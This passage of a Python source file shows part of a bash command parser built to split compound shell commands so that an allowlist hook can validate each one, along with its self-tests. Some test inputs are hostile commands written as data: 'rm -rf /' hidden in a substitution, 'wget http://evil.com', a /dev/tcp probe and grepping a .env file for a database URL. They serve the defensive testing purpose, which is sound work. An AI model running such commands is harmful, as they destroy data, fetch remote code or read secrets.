        pending = False  # previous token was a write redirect awaiting its path
        for t_type, t_val, t_off in tokens:
            if pending:
                pending = False
                # The path is the immediately following token. An operator (or a
                # case pattern) here means the redirect had no path operand
                # (malformed `> ;`) — neither names a file, so record nothing and
                # let this token be re-examined as a possible new redirect below.
                if t_type not in ('OP', 'CASE_PATTERN'):
                    targets.append((self._strip_quotes(t_val), t_off))
                    continue
            if t_type == 'REDIRECT' and t_val in self.WRITE_REDIRECTIONS_WITH_ARG:
                pending = True
            elif t_type == 'CMD_SUBST' and t_val.strip():
                targets.extend(self._scan_write_targets(t_val))
        return targets

    @staticmethod
    def _is_env_prefix(token: str) -> bool:
        """Check if token is an env var assignment prefix (e.g., 'KEY=' or 'KEY=partial')"""
        if not token or '=' not in token or token.startswith('-'):
            return False
        key = token.split('=', 1)[0]
        if not key or not (key[0].isalpha() or key[0] == '_'):
            return False
        return all(c.isalnum() or c == '_' for c in key)

    def _classify_token(self, token: str, offset: int = 0) -> Tuple[str, str, int]:
        """
        Classify token as ENV or WORD

        Args:
            token: Token string
            offset: Source offset where the token began

        Returns:
            (type, value, offset) tuple
        """
        # Check if it's an environment variable (KEY=VALUE format)
        if '=' in token and not token.startswith('-'):
            parts = token.split('=', 1)
            key = parts[0]
            # Valid env var: starts with letter or underscore, followed by alnum/underscore
            if key and (key[0].isalpha() or key[0] == '_'):
                if all(c.isalnum() or c == '_' for c in key):
                    return ('ENV', token, offset)

        return ('WORD', token, offset)

    def _split_on_operators(self, tokens: List[Tuple[str, str]]) -> List[List[Tuple[str, str]]]:
        """
        Split token list on operator boundaries

        Args:
            tokens: List of (type, value) tuples

        Returns:
            List of token groups (one per sub-command)
        """
        groups = []
        current_group = []
        skip_next = False  # Skip next token (redirect argument)

        for token_type, token_value, token_offset in tokens:
            if skip_next:
                # Don't skip operator tokens - they should always split commands
                # (This handles the case where heredoc delimiter is already consumed)
                if token_type != 'OP':
                    # Skip this token (it's the argument to a redirect)
                    skip_next = False
                    continue
                else:
                    # Don't skip the operator, but clear the skip flag
                    skip_next = False

            if token_type == 'OP':
                # Operator splits commands
                if current_group:
                    groups.append(current_group)
                    current_group = []
            elif token_type == 'REDIRECT':
                # Redirections are stripped
                # Only skip next token if this redirect takes an argument
                if token_value in self.REDIRECTIONS_WITH_ARG:
                    skip_next = True
            elif token_type == 'CASE_PATTERN':
                # A `case` arm pattern is data matched against a word, not a
                # command — drop it. Any command substitution inside it was
                # emitted as its own CMD_SUBST token and is still validated.
                continue
            else:
                # Regular token or ENV var
                current_group.append((token_type, token_value, token_offset))

        # Flush final group
        if current_group:
            groups.append(current_group)

        return groups

    def _normalize_command(self, tokens: List[Tuple[str, str]]) -> str:
        """
        Convert tokens back to normalized command string

        - Strips environment variables
        - Strips grouping parentheses left behind by subshell syntax
        - Joins remaining tokens with spaces
        - Normalizes whitespace

        Args:
            tokens: List of (type, value) tuples for a single command

        Returns:
            Normalized command string
        """
        # Strip leading environment variables
        words = []
        skip_env = True  # Skip env vars at the beginning

        for token_type, token_value, _token_offset in tokens:
            if skip_env and token_type == 'ENV':
                # Skip leading environment variables
                continue
            else:
                # Once we hit a non-ENV token, stop skipping
                skip_env = False
                if token_type in ('WORD', 'QUOTED'):
                    words.append(token_value)

        # Join and normalize whitespace
        result = ' '.join(words).strip()
        # Bash arithmetic compound command: (( expr )) — preserve the (( prefix
        # so _reduce_to_effective_command in pretool_hook can recognise it as a
        # no-op. Without this guard, _strip_grouping_tokens would peel both layers
        # of parens and leave a dangling token like `passed++` that matches no
        # allow pattern.
        if result.startswith('(('):
            return result
        return self._strip_grouping_tokens(result)

    def _strip_grouping_tokens(self, command: str) -> str:
        """
        Remove shell grouping tokens that can remain at command boundaries.

        The parser splits on operators like && and |, so a grouped command such
        as `(cd app && npm test)` or `{ git log; git status; }` can leave
        fragments like `(cd app`, `{ git log`, `npm test)`, or `}`. Subshell
        `()` and brace-group `{}` tokens do not change the command being
        validated, so strip them before matching permission patterns.

        Subshell '(' / ')' and brace-group '{' / '}' are handled differently
        because bash treats them differently:

        - '(' and ')' are metacharacters that self-delimit, so they glue to
          adjacent words ("(cd app", "head -40)"). We strip them even when glued.
        - '{' and '}' are reserved words recognized as a group ONLY when they
          are standalone tokens ("{ cmd; }"). A '{' or '}' glued to a word is
          brace/parameter expansion ("{a,b}", "${HOME}", "${arr[@]}") and must
          be left intact. So we strip braces only when they are whole tokens.

        Parens remain imperfect for glued non-grouping uses (arithmetic
        "$((1+2))", extglob "@(a|b)"); fully resolving those needs paren-depth
        tracking in the tokenizer, not string stripping. Case-arm patterns are
        no longer among them — the tokenizer recognizes `case ... in` and emits
        the pattern list as CASE_PATTERN tokens, which never reach this point.
        """
        if not command:
            return command

        words = command.split()
        if not words:
            return command

        while words:
            first = words[0]
            if first[0] == '(':
                words[0] = first[1:]
                if not words[0]:
                    words.pop(0)
            elif first == '{':
                words.pop(0)
            else:
                break

        while words:
            last = words[-1]
            if last[-1] == ')':
                words[-1] = last[:-1]
                if not words[-1]:
                    words.pop()
            elif last == '}':
                words.pop()
            else:
                break

        return ' '.join(words).strip()


# For testing
if __name__ == '__main__':
    import sys

    parser = BashCommandParser()

    # Test cases
    test_cases = [
        ("git status", ["git status"]),
        ("git diff | head -100", ["git diff", "head -100"]),
        ("GIT_PAGER=cat git diff", ["git diff"]),
        ("A=1 B=2 ./script.sh", ["./script.sh"]),
        ("npm install && npm test", ["npm install", "npm test"]),
        ("git diff > out.txt 2>&1", ["git diff"]),
        ('echo "foo | bar"', ['echo "foo | bar"']),
        ("cmd1 || cmd2", ["cmd1", "cmd2"]),
        ("ls -la | grep foo | wc -l", ["ls -la", "grep foo", "wc -l"]),
        ("PATH=\"\" ./script.sh", ["./script.sh"]),
        ("git diff activecdn-module/handler.go 2>&1 | head -100", ["git diff activecdn-module/handler.go", "head -100"]),
        ("GIT_PAGER=cat git diff activecdn-module/handler.go 2>&1 | head -100", ["git diff activecdn-module/handler.go", "head -100"]),
        # Heredoc tests
        ('cat << "EOF" | python3\nimport json\nprint("hello")\nEOF', ["cat", "python3"]),
        ('cat << \'EOF\' | python3\nimport json\nprint("hello")\nEOF', ["cat", "python3"]),
        ('cat <<EOF | grep foo\nbar\nbaz\nEOF', ["cat", "grep foo"]),
        # Multi-line pipeline
        ('git diff |\nhead -10', ["git diff", "head -10"]),
        ('ls -la |\ngrep foo', ["ls -la", "grep foo"]),
        # Line continuation
        ('ls -la \\\n| grep foo', ["ls -la", "grep foo"]),
        ('echo "hello" \\\n| wc -l', ['echo "hello"', 'wc -l']),  # Quotes preserved
        # Comments
        ('# this is a comment\ncurl -s http://example.com', ["curl -s http://example.com"]),
        ('# comment\necho foo # inline comment', ["echo foo"]),  # Inline comment stripped
        ('echo "# not a comment"', ['echo "# not a comment"']),  # # in quotes is not a comment
        # Command substitution
        ('VAR=$(curl -s http://example.com)', ["curl -s http://example.com"]),
        ('VAR=$(curl -s url | jq .)', ["curl -s url", "jq ."]),
        ('echo $(cat file.txt)', ["echo", "cat file.txt"]),
        ('RESULT=`grep foo file.txt`', ["grep foo file.txt"]),  # Backtick syntax
        ('VAR=$(nested $(echo inner))', ["nested", "echo inner"]),  # Nested (outer found first)
        # Env var with command substitution and path continuation
        ('GOWORK=$(pwd)/go.work go build ./...', ["go build ./...", "pwd"]),
        ('GOWORK=$(pwd)/go.work go build ./activecdn-module/... ./caddy-apps/... 2>&1 | head -60', ["go build ./activecdn-module/... ./caddy-apps/...", "head -60", "pwd"]),
        ('RESULT=`grep foo file.txt` echo bar', ["echo bar", "grep foo file.txt"]),
        ('PATH=$(dirname $0)/bin:$PATH python app.py', ["python app.py", "dirname $0"]),
        ('(cd apps/contributor && npx tsc --noEmit 2>&1 | head -40) && echo "---PRESENTATION---" && (cd apps/presentation && npx tsc --noEmit 2>&1 | head -40)', ["cd apps/contributor", "npx tsc --noEmit", "head -40", 'echo "---PRESENTATION---"', "cd apps/presentation", "npx tsc --noEmit", "head -40"]),
        ('(git status; git diff | head -20)', ["git status", "git diff", "head -20"]),
        # Brace group with redirection (strip standalone { and } grouping tokens)
        ('cd /tmp; { git log --oneline -3; echo "===STATUS==="; git status -s; } 2>&1', ["cd /tmp", "git log --oneline -3", 'echo "===STATUS==="', "git status -s"]),
        ('{ git status; git diff | head -20; }', ["git status", "git diff", "head -20"]),
        # Brace expansion / parameter expansion must NOT be stripped (not standalone)
        ('cp file.{txt,bak} /tmp', ["cp file.{txt,bak} /tmp"]),
        # Unquoted newlines split commands (like ';')
        ('echo foo\necho bar', ["echo foo", "echo bar"]),
        ('cd /tmp\nls -la\ngit status', ["cd /tmp", "ls -la", "git status"]),
        ('echo foo\n\n\necho bar', ["echo foo", "echo bar"]),  # Blank lines collapse
        ('\necho foo\n', ["echo foo"]),  # Leading/trailing newlines ignored
        # Newlines inside quotes are NOT separators (stays one sub-command;
        # internal whitespace is collapsed by normalization, as always)
        ('echo "line1\nline2"', ['echo "line1 line2"']),
        # if/then/else/fi one-liner spread across lines
        ('if git diff --quiet; then echo clean; else echo dirty; fi',
         ["if git diff --quiet", "then echo clean", "else echo dirty", "fi"]),
        ('if git diff --quiet\nthen echo clean\nfi',
         ["if git diff --quiet", "then echo clean", "fi"]),
        # Multi-line diagnostic script (the real-world failing case)
        ('echo "A:"\nls src/ | grep foo\necho "B:"\ngit ls-files | grep bar || echo none',
         ['echo "A:"', "ls src/", "grep foo", 'echo "B:"', "git ls-files", "grep bar", "echo none"]),
        # A command after a heredoc must not merge into the heredoc command
        ('cat <<EOF\nline\nEOF\necho done', ["cat", "echo done"]),
        ('cat <<EOF\nbody\nEOF\nls -la | grep foo', ["cat", "ls -la", "grep foo"]),
        # Brace GROUPS (standalone { } tokens) are stripped
        ('{ git log; git status; }', ["git log", "git status"]),
        ('{ echo hi; }', ["echo hi"]),
        # Brace/parameter EXPANSION (glued braces) is NOT stripped
        ('echo {a,b}', ["echo {a,b}"]),
        ('echo ${HOME}', ["echo ${HOME}"]),
        ('echo "${arr[@]}"', ['echo "${arr[@]}"']),
        ('ls foo{1,2}.txt', ["ls foo{1,2}.txt"]),
        # Subshell parens still strip even when glued
        ('(cd app && npm test)', ["cd app", "npm test"]),
        # Inside [[ ]] conditionals, &&/||/|/<> are expression operators, not
        # command separators/redirections — the whole test stays one sub-command.
        ('[[ "$ec" -ne 0 || "${nfail:-0}" -ne 0 ]]',
         ['[[ "$ec" -ne 0 || "${nfail:-0}" -ne 0 ]]']),
        ('[[ -f a && -f b ]]', ["[[ -f a && -f b ]]"]),
        ('[[ "$a" > "$b" ]]', ['[[ "$a" > "$b" ]]']),  # > is comparison, not redirect
        # A connector AFTER the closing ]] still splits normally.
        ('[[ -f x ]] || echo missing', ["[[ -f x ]]", "echo missing"]),
        ('if [[ "$a" == b || "$a" == c ]]; then echo hi; fi',
         ['if [[ "$a" == b || "$a" == c ]]', "then echo hi", "fi"]),
        # Command substitution inside [[ ]] is STILL extracted and validated.
        ('[[ $(rm -rf /) ]] || echo hi', ["[[ ]]", "echo hi", "rm -rf /"]),
        # A literal `)` inside a quoted regex bracket class must NOT close the
        # enclosing $(...) early. Before the quote-tracking fix, `[^)]` desynced
        # the tokenizer and stranded later tokens as bogus sub-commands.
        ('n=$(grep -oE "pos=\\([^)]*\\)" file | wc -l)',
         ['grep -oE "pos=\\([^)]*\\)" file', "wc -l"]),
        # The whole double-quoted arg stays one token, and `${v:0:14}` is NOT
        # stranded as a bogus standalone sub-command. The `$(basename $f)` is a
        # real command substitution that bash runs even inside double quotes, so
        # it is correctly extracted for validation.
        ('echo "$(basename $f) ${v:0:14}"',
         ['echo "$(basename $f) ${v:0:14}"', 'basename $f']),
        # Command substitution inside DOUBLE quotes is recognized: an inner `"`
        # must not flip the surrounding quote state. The real-world failing case
        # was a `git commit -m "$(cat <<'EOF' ... )"` whose heredoc body held
        # double quotes and blank lines; the body must not leak out as bogus
        # sub-commands, and the substitution runs only `cat`.
        ('echo "$(grep \"needle\" file)"',
         ['echo "$(grep \"needle\" file)"', 'grep "needle" file']),
        ('git commit -m "$(cat <<\'EOF\'\nfix: thing\n\nthrew "Cannot read\nundefined" here\nEOF\n)"',
         ['git commit -m "$(cat <<\'EOF\' fix: thing threw "Cannot read undefined" here EOF )"',
          'cat']),
        # An UNBALANCED quote in the heredoc body — an apostrophe in `node's` —
        # must not flip quote state inside the `$(...)` scan and mislocate the
        # closing `)`. The real-world failing case leaked the trailing
        # `)" ... git push origin master` back out as a bogus, non-allowlisted
        # sub-command; the body is data, so only `cat` and the following real
        # commands survive.
        ('git commit -m "$(cat <<\'EOF\'\nSmoke test the node\'s own bind IP (best-effort).\nEOF\n)"\ngit push origin master',
         ['git commit -m "$(cat <<\'EOF\' Smoke test the node\'s own bind IP (best-effort). EOF )"',
          'git push origin master',
          'cat']),
        # An unbalanced paren in the heredoc body must not move the depth count
        # and swallow the real closing `)`.
        ('echo "$(cat <<\'EOF\'\na lone ) paren and a ( too\nEOF\n)"\nls',
         ['echo "$(cat <<\'EOF\' a lone ) paren and a ( too EOF )"',
          'ls',
          'cat']),
        # A literal backtick in a heredoc body inside a `` `...` `` substitution
        # must not prematurely close it.
        ('echo "`cat <<\'EOF\'\nuse `code` spans\nEOF\n`"\nls',
         ['echo "`cat <<\'EOF\' use `code` spans EOF `"', 'ls', 'cat']),
        # Backtick substitution inside double quotes is likewise extracted.
        ('echo "result=`id -u`"', ['echo "result=`id -u`"', 'id -u']),
        # Arithmetic `$((...))` inside double quotes runs NO command, so its
        # operands must NOT be stranded as a bogus sub-command (`$(` is a prefix
        # of `$((`). A real command substitution nested in the arithmetic is
        # still extracted.
        ('echo "sum=$((1+2))"', ['echo "sum=$((1+2))"']),
        ('echo "x=$(( $(date +%s) + 1 ))"',
         ['echo "x=$(( $(date +%s) + 1 ))"', 'date +%s']),
        # Same hazard for process substitution <( ... ).
        ('diff <(grep -oE "a)b" x) y', ["diff y", 'grep -oE "a)b" x']),
        # fd-prefixed redirections: the fd digit must not leak as a phantom
        # command word, and `<>` must stay one operator (not split into < >).
        # The real-world failing case: a /dev/tcp port probe in a subshell.
        ('(exec 3<>/dev/tcp/localhost/5432) 2>/dev/null && echo OPEN',
         ["exec", "echo OPEN"]),
        ('grep -i DATABASE_URL .env 2>/dev/null', ["grep -i DATABASE_URL .env"]),
        ('cat file 3>out.txt', ["cat file"]),
        ('cmd 2>>log.txt', ["cmd"]),
        # A digit with a space before the redirect is a plain argument, and a
        # digit glued to a word stays part of that word (bash semantics).
        ('echo 3 > out.txt', ["echo 3"]),
        ('echo foo3>out.txt', ["echo foo3"]),
        # `case` pattern lists are data: `|` alternates patterns (not a pipe)
        # and `)` closes the list, so the patterns are dropped and only the arm
        # bodies survive as commands. The real-world failing case was a
        # `while read` filter loop whose multi-pattern arm split into bogus
        # sub-commands (`*docs*`, `*example*) continue`) and forced a prompt.
        ('case "$x" in a|b) echo hi;; *) echo bye;; esac',
         ['case "$x" in', "echo hi", "echo bye", "esac"]),
        ('case "$f" in *docs*|*/tasks/*|*example*) continue;; esac',
         ['case "$f" in', "continue", "esac"]),
        # The optional `(` opening a pattern list is dropped; an extglob's own
        # parens are balanced inside the pattern and do not close the list.
        ('case "$x" in (a|b) echo hi;; @(c|d)) echo yo;; esac',
         ['case "$x" in', "echo hi", "echo yo", "esac"]),
        # bash fallthrough terminators `;&` and `;;&` end an arm too.
        ('case $x in a) echo one;& b) echo two;;& *) echo three;; esac',
         ["case $x in", "echo one", "echo two", "echo three", "esac"]),
        # Nested case, including an inner `esac` glued to the outer arm's `;;`.
        ('case $a in x) case $b in y|z) echo deep;; esac;; *) echo out;; esac',
         ["case $a in", "case $b in", "echo deep", "esac", "echo out", "esac"]),
        # An arm body still splits normally on real operators.
        ('case $x in *) git status | head -5;; esac',
         ["case $x in", "git status", "head -5", "esac"]),
        # A command substitution in a pattern IS expanded by bash, so it is
        # still extracted and validated even though the pattern text is dropped.
        ('case $x in $(wget evil)) echo hi;; esac',
         ["case $x in", "echo hi", "esac", "wget evil"]),
        # `case` is only the keyword in command position. As a mere argument it
        # must NOT start pattern mode, or the commands after a later `in` would
        # be silently dropped instead of validated.
        ('echo case; for f in *; do rm -rf /tmp/x; done',
         ["echo case", "for f in *", "do rm -rf /tmp/x", "done"]),
        # A command after the closing `esac` is still validated.
        ('case $x in a) echo hi;; esac; wget http://evil.com',
         ["case $x in", "echo hi", "esac", "wget http://evil.com"]),
    ]

    print("=== Bash Command Parser Tests ===\n")

    passed = 0
    failed = 0

    for command, expected in test_cases:
        result = parser.parse_compound_command(command)
        success = result == expected

        if success:
            passed += 1
            status = "✓ PASS"
        else:
            failed += 1
            status = "✗ FAIL"

        print(f"{status}: {command!r}")
        print(f"  Expected: {expected}")
        print(f"  Got:      {result}")
        print()

    print(f"Results: {passed} passed, {failed} failed")

    # --- is_constant_value / extract_assignments ---
    print("\n=== Constant assignment helpers ===\n")
    const_cases = [
        ("/usr/local/bin/godot", "/usr/local/bin/godot"),
        ('"clang++"', "clang++"),
        ("'/opt/tool'", "/opt/tool"),
        ("3.14", "3.14"),
        ("$(which godot)", None),   # command substitution
        ("$HOME/bin", None),        # parameter expansion
        ("a b", None),              # whitespace
        ("*.txt", None),            # glob
        ("`pwd`", None),            # backtick
        ("", None),                 # empty
    ]
    for value, expected in const_cases:
        got = BashCommandParser.is_constant_value(value)
        ok = got == expected
        passed, failed = (passed + 1, failed) if ok else (passed, failed + 1)
        print(f"{'✓ PASS' if ok else '✗ FAIL'}: is_constant_value({value!r}) -> {got!r} (want {expected!r})")

    assign_cases = [
        # (command, expected [(name, value)] for STANDALONE assignments only)
        ("GODOT=/usr/local/bin/godot\n$GODOT --quit", [("GODOT", "/usr/local/bin/godot")]),
        ("A=1 B=2 ./script.sh", []),                 # env prefix, not standalone
        ("A=1\nB=2\n./x", [("A", "1"), ("B", "2")]),  # two standalone assignments
        # Dynamic value still reported raw, so reassignment can poison a constant.
        ("X=$(which godot)", [("X", "$(which godot)")]),
        ("GODOT=/usr/local/bin/godot\nGODOT=$(echo rm)",
         [("GODOT", "/usr/local/bin/godot"), ("GODOT", "$(echo rm)")]),
    ]
    for command, expected in assign_cases:
        got = [(n, v) for n, v, _off in parser.extract_assignments(command)]
        ok = got == expected
        passed, failed = (passed + 1, failed) if ok else (passed, failed + 1)
        print(f"{'✓ PASS' if ok else '✗ FAIL'}: extract_assignments({command!r}) -> {got} (want {expected})")

    print(f"\nResults: {passed} passed, {failed} failed")
    sys.exit(0 if failed == 0 else 1)
